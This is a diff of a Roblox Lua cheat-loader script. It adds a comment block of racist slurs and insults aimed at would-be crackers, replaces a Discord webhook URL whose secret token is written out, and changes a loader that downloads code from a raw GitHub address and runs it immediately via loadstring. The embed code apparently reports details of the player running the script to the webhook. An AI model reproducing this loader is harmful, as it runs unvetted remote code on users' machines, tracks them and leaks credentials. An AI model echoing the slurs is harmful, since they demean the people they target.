@@ -1,3 +1,9 @@
+--[[ 
+      NIGGA TRY TO CRACKING, ASSHOLE
+      NIGGA IP SO SICK , LOOK AT MONKEY
+      NIGGA NO IDEA TO WRITE SCRIPT
+--]]
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
@@ -30,12 +36,12 @@ local Embed = {
     timestamp = string.format('%d-%02d-%02dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec)
 }
 
-local webhookUrl = 'https://discord.com/api/webhooks/1395128660285063170/YYr0gKs79Utc-7n3AXTL78-oEZgDKZuO0FN0wrHLWy6Yz3aSCX97UTciAJhaEl2qxaoY'
+local webhookUrl = 'https://discord.com/api/webhooks/1395128663552294932/N-NHTExxnj9OiCYbbGoXYmApVNMiJFXjmNS5Oe_nP8AAE9wJFoCeegdRyI7rV2UreLl7'
 local requestFunction = syn and syn.request or http_request or http and http.request
 
 local function loadNextScript()
-    task.wait(0.5)
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/dyumra/Dupe-Anime-Rails/refs/heads/main/LoaderV2'))()
+    task.wait(0.25)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/dyumra/Let-CrackingNigga-ForScript/refs/heads/main/pornhub.org.com.anime.urmom.asshole.roblox.script.bydyumra.dyhubthebestforreal.nocap.infmoney.subscribedyhub.lua.txt.css.py.txt.xyz.nigga.lua.dyhubmainscript.nigga.lua.txt.css.com.lua.org.py.html.nigga.c.e.r.t.y.u.i.o.a.s.d.squidgame1.2.3.f.r.l.dyhub.lua'))()
 end
 
 local success, response = pcall(function()
